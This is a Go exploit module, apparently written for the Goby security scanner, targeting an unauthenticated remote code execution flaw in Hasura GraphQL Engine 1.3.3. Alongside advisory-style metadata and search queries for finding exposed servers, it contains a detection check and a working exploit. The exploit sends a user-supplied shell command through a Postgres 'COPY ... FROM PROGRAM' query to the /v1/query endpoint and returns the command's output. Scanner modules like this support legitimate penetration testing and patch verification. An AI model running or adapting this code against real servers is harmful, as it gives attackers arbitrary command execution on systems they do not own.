package exploits

import (
	"bytes"
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Hasura GraphQL 1.3.3 Remote Code Execution",
    "Description": "Hasura GraphQL Engine is a blazing-fast GraphQL server that gives you instant, realtime GraphQL APIs over Postgres, with webhook triggers on database events, and remote schemas for business logic. When Hasura GraphQL Engine don't need password to login, it will allows remote attackers to execute arbitrary code via execute Postgres SQL query.",
    "Impact": "Hasura GraphQL 1.3.3 Remote Code Execution",
    "Recommendation": "<p>The vendor has released a bug fix, please keep an eye on the update: <a href=\"https://github.com/hasura/graphql-engine/releases/tag/v2.0.9\">https://github.com/hasura/graphql-engine/releases/tag/v2.0.9</a></p>",
    "Product": "Hasura GraphQL Engine",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Hasura GraphQL 引擎 1.3.3 版本 query 文件 args 参数 远程代码执行漏洞",
            "Description": "<p>Hasura GraphQL 引擎是一个极快的 GraphQL 服务器，它通过 Postgres 为您提供即时、实时的 GraphQL API，具有数据库事件的 webhook 触发器，以及用于业务逻辑的远程模式。</p><p>Hasura GraphQL 存在远程代码执行漏洞。当 Hasura GraphQL Engine 不需要密码登录时，攻击者可通过执行 Postgres SQL 查询来执行任意代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "Impact": "<p>Hasura GraphQL 存在远程代码执行漏洞。当 Hasura GraphQL Engine 不需要密码登录时，攻击者可通过执行 Postgres SQL 查询来执行任意代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/hasura/graphql-engine/releases/tag/v2.0.9\" target=\"_blank\">https://github.com/hasura/graphql-engine/releases/tag/v2.0.9</a><br></p>",
            "Product": "Hasura GraphQL Engine",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Hasura GraphQL 1.3.3 Remote Code Execution",
            "Description": "Hasura GraphQL Engine is a blazing-fast GraphQL server that gives you instant, realtime GraphQL APIs over Postgres, with webhook triggers on database events, and remote schemas for business logic. When Hasura GraphQL Engine don't need password to login, it will allows remote attackers to execute arbitrary code via execute Postgres SQL query.",
            "Impact": "Hasura GraphQL 1.3.3 Remote Code Execution",
            "Recommendation": "<p>The vendor has released a bug fix, please keep an eye on the update: <a href=\"https://github.com/hasura/graphql-engine/releases/tag/v2.0.9\" target=\"_blank \">https://github.com/hasura/graphql-engine/releases/tag/v2.0.9</a><br></p>",
            "Product": "Hasura GraphQL Engine",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "server=\"Warp\"",
    "GobyQuery": "server=\"Warp\"",
    "Author": "ovi3",
    "Homepage": "https://hasura.io/",
    "DisclosureDate": "2021-12-12",
    "References": [
        "https://www.exploit-db.com/exploits/49802"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/v1/query",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "{\"type\":\"bulk\",\"args\":[{\"type\":\"run_sql\",\"args\":{\"sql\":\"SELECT md5('A18B9e0');\",\"cascade\":false,\"read_only\":false}}]}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"347b78cb6b3911b4dae9f0d5a6bc194e\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/v1/query",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "{\"type\":\"bulk\",\"args\":[{\"type\":\"run_sql\",\"args\":{\"sql\":\"SELECT md5('A18B9e0');\",\"cascade\":false,\"read_only\":false}}]}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"347b78cb6b3911b4dae9f0d5a6bc194e\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10188"
}`

	randomString := func(size int) string {
		alpha := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		var buffer bytes.Buffer
		rand.Seed(time.Now().UnixNano())
		for i := 0; i < size; i++ {
			buffer.WriteByte(alpha[rand.Intn(len(alpha))])
		}
		return buffer.String()
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/v1/query")
			cfg.Header.Store("Content-Type", "application/json")
			cfg.VerifyTls = false
			randStr := randomString(6)
			cfg.Data = fmt.Sprintf(`{"type":"bulk","args":[{"type":"run_sql","args":{"sql":"SELECT md5('%s');","cascade":false,"read_only":false}}]}`, randStr)
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 {
					md5Ret := fmt.Sprintf("%x", md5.Sum([]byte(randStr)))
					if strings.Contains(resp.RawBody, md5Ret) {
						return true
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			cfg := httpclient.NewPostRequestConfig("/v1/query")
			cfg.Header.Store("Content-Type", "application/json")
			cfg.VerifyTls = false
			cmd = strings.ReplaceAll(cmd, `\`, `\\`)
			cmd = strings.ReplaceAll(cmd, `"`, `\"`)
			cfg.Data = fmt.Sprintf(`{"type":"bulk","args":[{"type":"run_sql","args":{"sql":"SET LOCAL statement_timeout = 10000;","cascade":false,"read_only":false}},{"type":"run_sql","args":{"sql":"DROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM '%s';\nSELECT * FROM cmd_exec;","cascade":false,"read_only":false}}]}`, cmd)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Success = true
					reg := regexp.MustCompile(`\["cmd_output"\]|(?:,\["(.*?)"\])`)
					matches := reg.FindAllStringSubmatch(resp.Utf8Html, -1)
					var buffer bytes.Buffer
					for i := 1; i < len(matches); i++ {
						if i != 1 {
							buffer.WriteByte('\n')
						}
						buffer.WriteString(matches[i][1])
					}
					expResult.Output = buffer.String()
				}
			}
			return expResult
		},
	))
}
